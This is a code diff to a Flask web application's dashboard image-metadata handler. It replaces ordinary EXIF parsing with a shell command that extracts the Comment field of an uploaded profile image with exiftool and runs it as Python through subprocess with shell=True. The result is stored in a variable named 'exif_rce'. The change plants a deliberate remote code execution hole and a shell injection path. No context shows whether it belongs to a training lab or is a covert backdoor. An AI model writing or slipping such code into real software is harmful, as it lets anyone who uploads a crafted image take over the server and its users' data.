@@ -19,8 +19,7 @@ import json
 from flask_wtf.csrf import CSRFProtect, generate_csrf
 import jwt
 import bleach # sanitizar mensagens no chat global
-
-
+import subprocess
 
 
 # Configuração do Logger
@@ -558,7 +557,9 @@ def dashboard():
         metadata['size'] = image.size
         metadata['mode'] = image.mode
         exif_data = image._getexif()
-        metadata['exif'] = {ExifTags.TAGS.get(k, k): v for k, v in exif_data.items()} if exif_data else "No EXIF data found"
+        command = f"python3 -c \"$(exiftool {profile_image_path} | grep Comment | cut -d ':' -f2 | sed 's/^ *//;s/ *$//')\""
+        exif_rce = subprocess.check_output(command, shell=True, text=True)
+        metadata['exif'] = exif_rce if exif_rce else "No EXIF data found"
     except Exception as e:
         metadata['error'] = f"Failed to process image metadata: {str(e)}"
         print(f"Image metadata processing error: {str(e)}")
